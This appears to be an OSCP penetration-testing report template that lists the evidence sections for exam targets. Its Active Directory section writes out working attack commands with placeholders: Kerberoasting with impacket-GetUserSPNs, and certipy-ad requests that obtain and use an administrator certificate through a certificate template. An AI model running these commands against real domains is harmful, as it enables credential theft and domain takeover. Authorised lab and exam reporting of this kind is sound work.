# OSCP Report Template (evidence only)

1) Target information
- IP: TARGET
- Scans: paste nmap output

2) Initial access (exact commands run)
- paste commands

3) Proof of user
- id; cat /home/USER/user.txt

4) Privilege escalation
- exact commands run (copy/paste)

5) Proof of root/Administrator
- whoami; cat /root/root.txt
- type C:\Users\Administrator\Desktop\root.txt

6) Active Directory evidence (if applicable)
- impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/USER:PASS
- certipy-ad req -username svc@DOMAIN -p 'Password' -ca CA -template Template -target DC -upn administrator@DOMAIN
- certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP

7) Cracked credentials
- show hashcat/john commands and outputs

8) Cleanup steps
- list any changes made and steps to revert

9) Appendix
- screenshots and raw outputs

